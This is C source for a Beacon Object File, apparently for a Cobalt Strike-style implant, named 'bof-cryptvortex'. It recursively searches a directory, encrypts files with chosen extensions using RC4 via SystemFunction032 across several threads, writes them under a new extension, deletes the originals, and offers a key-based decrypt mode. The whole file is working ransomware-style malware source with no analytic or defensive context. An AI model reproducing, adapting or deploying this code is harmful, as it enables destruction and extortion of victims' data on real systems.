#include <windows.h>
#include "beacon.h"

typedef struct _CRYPT_FILE_META {
    CHAR *fileName;
    CHAR *cryptionkey;
    CHAR *extension;
    BOOL dwThreadRelease;
    BOOL actionType;
} CRYPT_FILE_META, *PCRYPT_FILE_META;

typedef struct _PVOID_STRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} PVOID_STRING, *PPVOID_STRING;

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$FindFirstFileA(LPCSTR, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileA(HANDLE, LPWIN32_FIND_DATAA);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE, PLARGE_INTEGER);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForMultipleObjects(DWORD, const HANDLE*, BOOL, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT NTSTATUS WINAPI ADVAPI32$SystemFunction032(PPVOID_STRING, PPVOID_STRING);

DECLSPEC_IMPORT char* MSVCRT$strtok(char * __restrict__ _Str, const char * __restrict__ _Delim);
DECLSPEC_IMPORT char* MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
DECLSPEC_IMPORT char* MSVCRT$strstr(const char* __s1, const char* __s2);
DECLSPEC_IMPORT int MSVCRT$sprintf(char * __restrict__ _Dest, const char * __restrict__ _Format, ...);
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *_Str);
DECLSPEC_IMPORT int MSVCRT$strcmp(const char *_Str1, const char *_Str2);
DECLSPEC_IMPORT void* MSVCRT$memcpy(void *_Dst, const void *_Src, size_t _MaxCount);
DECLSPEC_IMPORT void* MSVCRT$memset(void *_Dst, int _Val, size_t _Size);

#define MAX_EXTENSIONS 100
#define MAX_ARGS 8

static void *bAlloc(SIZE_T size) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

static void bFree(void **ptr) {
    if (ptr && *ptr) {
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, *ptr);
        *ptr = NULL;
    }
}

static int parse_cmdline(char *line, char **argv, int max_args) {
    int count = 0;
    char *p = line;

    while (count < max_args && p && *p) {
        while (*p == ' ' || *p == '\t' || *p == '\r' || *p == '\n') {
            p++;
        }
        if (!*p) {
            break;
        }
        if (*p == '"') {
            p++;
            argv[count++] = p;
            while (*p && *p != '"') {
                p++;
            }
            if (*p == '"') {
                *p++ = '\0';
            }
        } else {
            argv[count++] = p;
            while (*p && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') {
                p++;
            }
            if (*p) {
                *p++ = '\0';
            }
        }
    }

    return count;
}

static PVOID RC4Encrypt(UCHAR* input, DWORD inputlength, UCHAR* key, DWORD keylen) {
    PVOID_STRING Rc4Key;
    PVOID_STRING encryptedBufferString;
    PVOID out = NULL;

    Rc4Key.Buffer = key;
    Rc4Key.Length = Rc4Key.MaximumLength = keylen;
    encryptedBufferString.Buffer = bAlloc(inputlength + 1);
    if (!encryptedBufferString.Buffer) {
        return NULL;
    }
    MSVCRT$memcpy(encryptedBufferString.Buffer, input, inputlength);
    encryptedBufferString.Length = encryptedBufferString.MaximumLength = inputlength;
    ADVAPI32$SystemFunction032(&encryptedBufferString, &Rc4Key);
    out = encryptedBufferString.Buffer;
    return out;
}

static DWORD WINAPI EnDnThread(PCRYPT_FILE_META pCryptFileMeta) {
    UCHAR *encryptedfileBuffer = NULL;
    HANDLE hFile = NULL;
    HANDLE hencryptedFile = NULL;
    DWORD dwBytesRead = 0;
    DWORD dwBytesWritten = 0;
    DWORD dwfilesize = 0;
    LARGE_INTEGER filesize;
    CHAR *fileBuffer = NULL;
    BOOL doEncrypt = pCryptFileMeta->actionType;
    CHAR *fileName = NULL;
    CHAR *cryptionkey = NULL;
    CHAR *extension = NULL;
    CHAR *newFileName = NULL;
    size_t fileNameLen = 0;
    size_t keyLen = 0;
    size_t extLen = 0;
    char *splitter = NULL;

    fileNameLen = MSVCRT$strlen(pCryptFileMeta->fileName);
    keyLen = MSVCRT$strlen(pCryptFileMeta->cryptionkey);
    extLen = MSVCRT$strlen(pCryptFileMeta->extension);

    fileName = (CHAR *)bAlloc(fileNameLen + 1);
    cryptionkey = (CHAR *)bAlloc(keyLen + 1);
    extension = (CHAR *)bAlloc(extLen + 1);
    newFileName = (CHAR *)bAlloc(fileNameLen + extLen + 1);
    if (!fileName || !cryptionkey || !extension || !newFileName) {
        goto cleanUp;
    }

    MSVCRT$memcpy(fileName, pCryptFileMeta->fileName, fileNameLen);
    MSVCRT$memcpy(cryptionkey, pCryptFileMeta->cryptionkey, keyLen);
    MSVCRT$memcpy(extension, pCryptFileMeta->extension, extLen);

    if (doEncrypt) {
        MSVCRT$memcpy(newFileName, pCryptFileMeta->fileName, fileNameLen);
        MSVCRT$memcpy(newFileName + fileNameLen, pCryptFileMeta->extension, extLen);
    } else {
        MSVCRT$memcpy(newFileName, pCryptFileMeta->fileName, fileNameLen);
        splitter = MSVCRT$strstr(newFileName, extension);
        if (splitter) {
            splitter[0] = '\0';
        }
    }

    pCryptFileMeta->dwThreadRelease = TRUE;
    hFile = KERNEL32$CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        goto cleanUp;
    }
    if (!KERNEL32$GetFileSizeEx(hFile, &filesize)) {
        goto cleanUp;
    }
    dwfilesize = (DWORD)filesize.QuadPart;
    fileBuffer = (CHAR *)bAlloc(dwfilesize);
    if (!fileBuffer) {
        goto cleanUp;
    }
    KERNEL32$ReadFile(hFile, fileBuffer, dwfilesize, &dwBytesRead, 0);
    KERNEL32$CloseHandle(hFile);
    hFile = NULL;
    encryptedfileBuffer = (UCHAR *)RC4Encrypt((UCHAR *)fileBuffer, dwfilesize, (UCHAR *)cryptionkey, (DWORD)keyLen);
    if (!encryptedfileBuffer) {
        goto cleanUp;
    }
    hencryptedFile = KERNEL32$CreateFileA(newFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hencryptedFile == INVALID_HANDLE_VALUE) {
        goto cleanUp;
    }
    KERNEL32$WriteFile(hencryptedFile, encryptedfileBuffer, dwfilesize, &dwBytesWritten, NULL);
    KERNEL32$CloseHandle(hencryptedFile);
    KERNEL32$DeleteFileA(fileName);
    if (doEncrypt) {
        BeaconPrintf(CALLBACK_OUTPUT, "[E] %s\n", fileName);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[D] %s\n", fileName);
    }

cleanUp:
    if (hFile) {
        KERNEL32$CloseHandle(hFile);
    }
    bFree((void **)&newFileName);
    bFree((void **)&encryptedfileBuffer);
    bFree((void **)&fileBuffer);
    bFree((void **)&fileName);
    bFree((void **)&cryptionkey);
    bFree((void **)&extension);
    return 1;
}

static INT Crypter(CHAR* cmdArgs, CHAR* extension, CHAR* cryptionkey, BOOL actionType, CHAR *extension_list[MAX_EXTENSIONS], INT extensions_count) {
    INT threadCount = 0;
    INT MAXTHREAD_COUNT = 9;
    HANDLE threadArray[MAX_EXTENSIONS];
    INT cryptedFiles = 0;
    CHAR originFilePath[MAX_PATH] = { 0 };
    WIN32_FIND_DATAA Filelist;
    HANDLE hFind;
    size_t cmdLen = 0;

    MSVCRT$strcpy(originFilePath, cmdArgs);
    cmdLen = MSVCRT$strlen(cmdArgs);
    if (cmdLen > 0 && cmdArgs[cmdLen - 1] == '*') {
        hFind = KERNEL32$FindFirstFileA(originFilePath, &Filelist);
        originFilePath[cmdLen - 1] = '\0';
    } else {
        CHAR hFindPath[MAX_PATH] = { 0 };
        MSVCRT$sprintf(hFindPath, "%s*", cmdArgs);
        hFind = KERNEL32$FindFirstFileA(hFindPath, &Filelist);
    }

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (Filelist.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (MSVCRT$strcmp(Filelist.cFileName, ".") == 0) {
                    continue;
                }
                if (MSVCRT$strcmp(Filelist.cFileName, "..") == 0) {
                    continue;
                }
                CHAR createFilePath[1024] = { 0 };
                MSVCRT$sprintf(createFilePath, "%s%s\\", originFilePath, Filelist.cFileName);
                cryptedFiles += Crypter(createFilePath, extension, cryptionkey, actionType, extension_list, extensions_count);
            } else {
                BOOL foundextension = FALSE;
                for (int i = 0; i < extensions_count; i++) {
                    if (MSVCRT$strstr(Filelist.cFileName, extension_list[i]) != NULL) {
                        foundextension = TRUE;
                        break;
                    }
                }
                if (foundextension) {
                    CHAR createFilePath[1024] = { 0 };
                    CRYPT_FILE_META CryptFileMeta = { 0 };
                    MSVCRT$sprintf(createFilePath, "%s%s", originFilePath, Filelist.cFileName);
                    CryptFileMeta.fileName = createFilePath;
                    CryptFileMeta.cryptionkey = cryptionkey;
                    CryptFileMeta.extension = extension;
                    CryptFileMeta.dwThreadRelease = FALSE;
                    CryptFileMeta.actionType = actionType;
                    threadArray[threadCount] = KERNEL32$CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EnDnThread, &CryptFileMeta, 0, 0);
                    if (threadArray[threadCount] != NULL && threadArray[threadCount] != INVALID_HANDLE_VALUE) {
                        while (CryptFileMeta.dwThreadRelease == FALSE) {
                            KERNEL32$WaitForSingleObject((HANDLE)-1, 100);
                        }
                        threadCount++;
                        if (threadCount == MAXTHREAD_COUNT) {
                            KERNEL32$WaitForMultipleObjects(MAXTHREAD_COUNT, threadArray, TRUE, INFINITE);
                            for (int i = 0; i < MAXTHREAD_COUNT; i++) {
                                KERNEL32$CloseHandle(threadArray[i]);
                            }
                            threadCount = 0;
                        }
                    }
                    cryptedFiles++;
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &Filelist));
        KERNEL32$FindClose(hFind);
    }
    if (threadCount != 0) {
        KERNEL32$WaitForMultipleObjects(threadCount, threadArray, TRUE, INFINITE);
        for (int i = 0; i < threadCount; i++) {
            KERNEL32$CloseHandle(threadArray[i]);
        }
    }
    return cryptedFiles;
}

static void print_usage(void) {
    BeaconPrintf(CALLBACK_ERROR,
        "Usage: bof-cryptvortex --- encrypt <password> \"<directory>\" <encrypted_ext> \"<ext1,ext2,...>\"\n"
        "       bof-cryptvortex --- decrypt <password> \"<directory>\" <encrypted_ext>\n"
        "Example: bof-cryptvortex --- encrypt secret@123 \"C:\\data\\\" .enc \".txt,.ps1\"\n");
}

static void run_cryptvortex(char **argv, int argc) {
    INT extensionsCount = 0;
    CHAR *extensionsList[MAX_EXTENSIONS];
    BOOL doEncrypt = TRUE;
    CHAR *actionType = NULL;
    CHAR *encryptionkey = NULL;
    CHAR *encryptPath = NULL;
    CHAR *extension = NULL;
    CHAR *extCopy = NULL;
    CHAR *token = NULL;
    INT cryptedFileCount = 0;

    MSVCRT$memset(extensionsList, 0, sizeof(extensionsList));

    if (argc < 4) {
        print_usage();
        return;
    }

    actionType = argv[0];
    encryptionkey = argv[1];
    encryptPath = argv[2];
    extension = argv[3];

    if (MSVCRT$strcmp(actionType, "encrypt") == 0) {
        if (argc < 5) {
            print_usage();
            return;
        }
        extCopy = (CHAR *)bAlloc(MSVCRT$strlen(argv[4]) + 1);
        if (!extCopy) {
            BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
            return;
        }
        MSVCRT$memcpy(extCopy, argv[4], MSVCRT$strlen(argv[4]) + 1);
        token = MSVCRT$strtok(extCopy, ",");
        while (token != NULL && extensionsCount < MAX_EXTENSIONS) {
            extensionsList[extensionsCount] = (CHAR *)bAlloc(MSVCRT$strlen(token) + 1);
            if (!extensionsList[extensionsCount]) {
                break;
            }
            MSVCRT$memcpy(extensionsList[extensionsCount], token, MSVCRT$strlen(token) + 1);
            extensionsCount++;
            token = MSVCRT$strtok(NULL, ",");
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Encryption directory: %s\n", encryptPath);
        BeaconPrintf(CALLBACK_OUTPUT, "  - Encryption key: %s\n", encryptionkey);
        BeaconPrintf(CALLBACK_OUTPUT, "  - Encrypted file extension: %s\n", extension);
        BeaconPrintf(CALLBACK_OUTPUT, "  - Extensions to encrypt: %d\n", extensionsCount);
        for (int i = 0; i < extensionsCount; i++) {
            BeaconPrintf(CALLBACK_OUTPUT, "    - %s\n", extensionsList[i]);
        }
    } else if (MSVCRT$strcmp(actionType, "decrypt") == 0) {
        extensionsList[extensionsCount] = (CHAR *)bAlloc(MSVCRT$strlen(extension) + 1);
        if (!extensionsList[extensionsCount]) {
            bFree((void **)&extCopy);
            BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
            return;
        }
        MSVCRT$memcpy(extensionsList[extensionsCount], extension, MSVCRT$strlen(extension) + 1);
        extensionsCount++;
        doEncrypt = FALSE;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Decryption directory: %s\n", encryptPath);
        BeaconPrintf(CALLBACK_OUTPUT, "  - Decryption key: %s\n", encryptionkey);
        BeaconPrintf(CALLBACK_OUTPUT, "  - Decrypted file extension: %s\n", extension);
    } else {
        print_usage();
        bFree((void **)&extCopy);
        return;
    }

    cryptedFileCount = Crypter(encryptPath, extension, encryptionkey, doEncrypt, extensionsList, extensionsCount);
    if (doEncrypt) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+++] Encrypted %d file(s) [+++]\n", cryptedFileCount);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+++] Decrypted %d file(s) [+++]\n", cryptedFileCount);
    }

    bFree((void **)&extCopy);
    for (int i = 0; i < extensionsCount; i++) {
        bFree((void **)&extensionsList[i]);
    }
}

void go(char *args, int len) {
    datap parser = { 0 };
    char *packed = NULL;
    char *line = NULL;
    char *argv[MAX_ARGS] = { 0 };
    int packed_len = 0;
    int argc = 0;

    if (len <= 0) {
        print_usage();
        return;
    }

    BeaconDataParse(&parser, args, len);
    packed = BeaconDataExtract(&parser, &packed_len);
    if (!packed || packed_len <= 0) {
        print_usage();
        return;
    }

    line = (char *)bAlloc((SIZE_T)packed_len + 1);
    if (!line) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
        return;
    }
    MSVCRT$memcpy(line, packed, packed_len);

    argc = parse_cmdline(line, argv, MAX_ARGS);
    run_cryptvortex(argv, argc);
    bFree((void **)&line);
}
